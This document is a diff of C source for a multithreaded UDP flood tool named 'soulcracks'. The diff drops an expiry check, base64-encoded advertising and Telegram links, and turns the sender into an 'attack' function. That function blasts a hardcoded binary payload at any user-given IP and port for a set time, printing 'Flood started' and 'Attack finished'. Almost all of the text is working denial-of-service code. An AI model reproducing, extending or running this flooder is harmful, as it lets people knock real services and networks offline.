@@ -3,176 +3,50 @@
 #include <string.h>
 #include <unistd.h>
 #include <arpa/inet.h>
-#include <time.h>
 #include <pthread.h>
-#include <ctype.h>
+#include <time.h>
 
-#define BUFFER_SIZE 8000
-
-// Global variables to be used by threads
-char *ip;
-int port;
-int duration;
-
-// Large unused array to increase binary size
-char padding_data[2 * 1024 * 1024];  // 2 MB
-
-// Base64 encoding function
-void base64_encode(const unsigned char *data, char *encoded, size_t length) {
-    const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-    int i = 0, j = 0, in_ = 0;
-    unsigned char char_array_3[3], char_array_4[4];
-
-    while (length--) {
-        char_array_3[i++] = *(data++);
-        if (i == 3) {
-            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
-            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
-            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
-            char_array_4[3] = char_array_3[2] & 0x3f;
-
-            for (i = 0; (i < 4); i++) {
-                encoded[j++] = base64_chars[char_array_4[i]];
-            }
-            i = 0;
-        }
-    }
-
-    if (i) {
-        for (int k = i; k < 3; k++) {
-            char_array_3[k] = '\0';
-        }
-
-        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
-        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
-        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
-        char_array_4[3] = char_array_3[2] & 0x3f;
-
-        for (int k = 0; (k < i + 1); k++) {
-            encoded[j++] = base64_chars[char_array_4[k]];
-        }
-
-        while ((i++ < 3)) {
-            encoded[j++] = '=';
-        }
-    }
-    encoded[j] = '\0';
+void usage() {
+    printf("Usage: ./soulcracks ip port time threads\n");
+    exit(1);
 }
 
-// Base64 decoding function
-void base64_decode(const char *encoded, char *decoded) {
-    const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-    int i = 0, j = 0, in_len = strlen(encoded);
-    int in_ = 0;
-    unsigned char char_array_4[4], char_array_3[3];
+struct thread_data {
+    char *ip;
+    int port;
+    int time;
+};
 
-    while (in_len-- && (encoded[in_] != '=') && (isalnum(encoded[in_]) || (encoded[in_] == '+') || (encoded[in_] == '/'))) {
-        char_array_4[i++] = encoded[in_]; in_++;
-        if (i == 4) {
-            for (i = 0; i < 4; i++) {
-                char_array_4[i] = strchr(base64_chars, char_array_4[i]) - base64_chars;
-            }
-            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
-            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
-            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
-
-            for (i = 0; i < 3; i++) {
-                decoded[j++] = char_array_3[i];
-            }
-            i = 0;
-        }
-    }
-
-    if (i) {
-        for (int k = i; k < 4; k++) {
-            char_array_4[k] = 0;
-        }
-
-        for (int k = 0; k < 4; k++) {
-            char_array_4[k] = strchr(base64_chars, char_array_4[k]) - base64_chars;
-        }
-
-        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
-        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
-        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
-
-        for (int k = 0; k < (i - 1); k++) {
-            decoded[j++] = char_array_3[k];
-        }
-    }
-    decoded[j] = '\0';
-}
-
-// Function to check expiration date
-int is_expired() {
-    struct tm expiry_date = {0};
-    time_t now;
-    double seconds;
-
-    // Set the expiration date to August 13, 2024
-    expiry_date.tm_year = 2028 - 1900;  // Years since 1900
-    expiry_date.tm_mon = 7;            // Months since January (0-based)
-    expiry_date.tm_mday = 13;          // Day of the month
-
-    time(&now);
-    seconds = difftime(mktime(&expiry_date), now);
-
-    return seconds < 0;
-}
-
-// Function to attempt to open a URL based on available tools
-void open_url(const char *url) {
-    // Try various methods to open a URL
-    if (system("command -v xdg-open > /dev/null") == 0) {
-        system("xdg-open https://t.me/SOULCRACKS");
-    } else if (system("command -v gnome-open > /dev/null") == 0) {
-        system("gnome-open https://t.me/SOULCRACKS");
-    } else if (system("command -v open > /dev/null") == 0) {
-        system("open https://t.me/SOULCRACKS");
-    } else if (system("command -v start > /dev/null") == 0) {
-        system("start https://t.me/SOULCRACKS");
-    } else {
-        fprintf(stderr, "My channel link https://t.me/SOULCRACKS\n");
-    }
-}
-
-// Function to send UDP traffic
-void *send_udp_traffic(void *arg) {
+void *attack(void *arg) {
+    struct thread_data *data = (struct thread_data *)arg;
     int sock;
     struct sockaddr_in server_addr;
-    char buffer[BUFFER_SIZE];
-    int sent_bytes;
+    time_t endtime;
 
-    // Create a socket
+    char *payloads[] = {
+"\x13\xE7\x4F\x61\x05\x9B\x53\x72\x3A\x73\xE2\xD5\x48\xE5\x19\x80\x0E\x2F\x01\xBD\x33\xD5\x31\xBA\x2D\xAD\x70\x1D\x57\x4A\xA1\xA5\x54\x84\xDD\x50\x40\x41\x51\xA1\x67\xF2\x37\x84\x25\x37\x19\x28\xD4\xFB\x99\xE3\xAE\x29\xA1\xE2\x61\xD1\xBB\x40\x25\x99\xE4\x59\xD3\xDA\x76\x42\x02\x54\x28\xC7\xC0\x8C\x74\x10\x0C\x4D\x66\xC7\x01\x0C\xA6\x3E\x75\xB9\x90\xEA\x27\x56\x38\xB6\x23\x73\x68\x7A\x8F\xFF\xEF\xDA\xFB\xF7\xCE\x29\xBC\xA2\xCB\x9E\x12\x2F\x80\x91\xCE\x23\x54\x24\x5D\xDA\x31\xAE\xAC\x42\xD3\x43\x39\x51\x40\x46\xC3\x0D\xE0\x7F\x4B\x7E\x26\xFC\xCB\x37\xDD\x76\x02\xD2\x0C\x85\xA9\x05\x27\x52\xED\x18\xD4\x53\x0E\xB5\xF8\xCF\x14\x31\x8C\x8B\x82\x61\xAD\x3B\xE8\xB5\x1C\x3C\xD9\x25\x24\x95\x48\xE3\x8A\x72\x70\x7F\x7A\xF1\xB1\x21\xDD\xD7\x43\x95\xF9\x1C\x04\x21\x1C\x05\xDC\xB5\x8D\xCE\xD3\x0E\x72\x2C\xF2\xDC\x09\xE1\xEF\x29\xC8\x7A\x15\x73\x9E\xFB\x26\xCA\xA8\xDA\x7B\x60\xAB\x3C\xFF\x80\xD8\xE9\xFD\xD9\x20\x4A\xE1\x78\x5F\x67\xBD\x49\xD4\x60\xB7\x86\x96\xB2\xE5\xB6\x84\xA8\xCC\xC8\xD1\xBF\x13\x75\x07\x53\x33\xFD\x6E\xBB\x40\x37\xB7\xCF\xE0\x5B\x53\x06\x31\x85\xD9\x57\x12\xF8\xAD\x83\x96\xC9\xEB\xA1\x0D\xD2\x8B\x88\x65\xDD\x7E\x4B\x05\xF0\x05\x3B\x2B\x30\x9B\x09\x8F\xE6\xD3\x1B\xF4\xDB\xCE\xB4\x65\x9A\x44\x77\x27\xF7\xBE\xD8\x2E\x4C\x8E\xFB\xCE\x38\x2A\x2C\xAF\x3E\x02\xCC\x56\x3F\x73\xA7\x61\xFB\xC4\x0D\x3D\x92\xB4\x83\xBA\xCD\x2E\x08\x59\xE0\xD9\x38\xC9\xBF\xB8\x0B\x89\x61\xD6\x67\x15\x09\x1E\xF9\x20\x36\xC2\xCF\x88\xC3\x20\xB9\x7C\x24\x76\xD1\xBA\xF4\xE0\x96\x34\x8E\xE1\x53\x43\x52\x29\x2D\xA7\xAD\x3E\xDA\x99\x0E\x54\xCF\x76\x87\x61\x59\xEB\xD0\x5F\x13\xD7\x60\xF6\x81\x8B\x0C\x28\x73\xF2\xFB\xA6\x5D\x05\x86\x6B\x59\x00\x30\x5B\xAD\xCF\x11\x1B\xD6\xE3\x68\xAA\xA6\xE2\xB1\x2A\x0B\xA3\xA3\x94\xB1\xEA\x4C\xD9\x1D\xE8\xD4\x89\x83\x39\xED\x86\x8F\x76\x68\x3D\x23\x31\x1A\xB3\xAF\x5B\x50\x93\x2A\x04\xFB\xCE\x97\xE6\xBD\x1C\x0F\xE7\x11\xA8\xBA\xBF\xD5\x42\xD6\x3C\xC9\x35\x68\x10\xFA\xA8\xBC\x00\x03\x44\x5F\x1E\x18\x08\xB9\x74\x3B\x1F\xEA\xBF\x48\x07\x7C\x92\x27\xA2\x85\x6E\x0A\xEC\x21\xBB\xCB\xB6\x67\xBC\xDF\x3B\x93\xCC\x89\x69\xA3\x4E\x57\xFC\x44\x3F\xA9\x0E\xCC\x91\xC0\x8A\x69\x00\xBD\xF4\x7D\x2B\xEA\xC9\x8B\xF0\x3D\xA4\x8A\x8C\x0A\xA7\x3A\xC2\x37\x30\x3E\xE9\xA1\x9B\xD6\x59\x92\x12\x17\x19\xC8\xDE\x93\xF8\x33\x75\x45\x5F\xEA\x3D\x81\x58\x46\xA8\x82\xFC\x59\x63\xD1\x02\x6A\xCE\x5C\x98\x86\x60\xE0\xFB\xD6\x01\x1F\x9B\x6A\x15\x73\xFD\xE8\x50\xB8\xBB\xB7\xBC\x08\x64\xD6\xD2\x14\x5A\x7F\x04\x8C\xAA\x9C\x5F\x43\x15\x10\xCF\x13\xC7\xCE\xCB\xF9\x60\xAA\x1C\x68"
+ };
+
     if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
         perror("Socket creation failed");
         pthread_exit(NULL);
     }
 
-    // Set up the server address
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(port);
-    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
-        perror("Invalid address/ Address not supported");
-        close(sock);
-        pthread_exit(NULL);
-    }
+    server_addr.sin_port = htons(data->port);
+    server_addr.sin_addr.s_addr = inet_addr(data->ip);
 
-    // Prepare the message to send
-    snprintf(buffer, sizeof(buffer), "UDP traffic test");
+    endtime = time(NULL) + data->time;
 
-    // Calculate the end time
-    time_t start_time = time(NULL);
-    time_t end_time = start_time + duration;
-
-    while (time(NULL) < end_time) {
-        sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
-                            (struct sockaddr *)&server_addr, sizeof(server_addr));
-        if (sent_bytes < 0) {
-            perror("Send failed");
-            close(sock);
-            pthread_exit(NULL);
+    while (time(NULL) <= endtime) {
+        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
+            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
+                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+                perror("Send failed");
+                close(sock);
+                pthread_exit(NULL);
+            }
         }
     }
 
@@ -182,49 +56,40 @@ void *send_udp_traffic(void *arg) {
 
 int main(int argc, char *argv[]) {
     if (argc != 5) {
-        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
-        exit(EXIT_FAILURE);
+        usage();
     }
 
-    // Check expiration date
-    if (is_expired()) {
-        // Base64 encoded error message
-        const char *encoded_error_message = "VGhpcyBmaWxlIGlzIGNsb3NlZCBAVklQTU9EU1hBRE1JTgpUaGlzIGlzIGZyZWUgdmVyc2lvbgpETSB0byBidXkKQFZJUE1PRFNYQURNSU4=";
-        char decoded_error_message[512];
-        base64_decode(encoded_error_message, decoded_error_message);
-        fprintf(stderr, "Error: %s\n", decoded_error_message);
-        open_url("https://t.me/SOULCRACKS");
-        exit(EXIT_FAILURE);
-    }
-
-    // Initialize global variables
-    ip = argv[1];
-    port = atoi(argv[2]);
-    duration = atoi(argv[3]);
+    char *ip = argv[1];
+    int port = atoi(argv[2]);
+    int time = atoi(argv[3]);
     int threads = atoi(argv[4]);
 
-    // Base64 encoded watermark message
-    const char *encoded_watermark = "QHRlbGVncmFtIGNoYW5uZWwgQFNPVUxDUkFDS1MgVklQTU9EU1hBRE1JTiBUZXJtcyBvZiBzZXJ2aWNlIHVzZSBhbmQgbGVnYWwgY29uc2lkZXJhdGlvbnMu";
-    char decoded_watermark[256];
+    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
 
-    // Decode and print the watermark
-    base64_decode(encoded_watermark, decoded_watermark);
-    printf("Watermark: %s\n", decoded_watermark);
+    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);
 
-    // Initialize the padding data to ensure it is not optimized away
-    memset(padding_data, 0, sizeof(padding_data));
-
-    pthread_t tid[threads];
     for (int i = 0; i < threads; i++) {
-        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
+
+        struct thread_data *data = malloc(sizeof(struct thread_data));
+        data->ip = ip;
+        data->port = port;
+        data->time = time;
+
+
+        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
             perror("Thread creation failed");
-            exit(EXIT_FAILURE);
+            free(data);
+            free(thread_ids);
+            exit(1);
         }
+        printf("Launched thread with ID: %lu\n", thread_ids[i]);
     }
 
     for (int i = 0; i < threads; i++) {
-        pthread_join(tid[i], NULL);
+        pthread_join(thread_ids[i], NULL);
     }
 
+    free(thread_ids);
+    printf("Attack finished\n");
     return 0;
 }
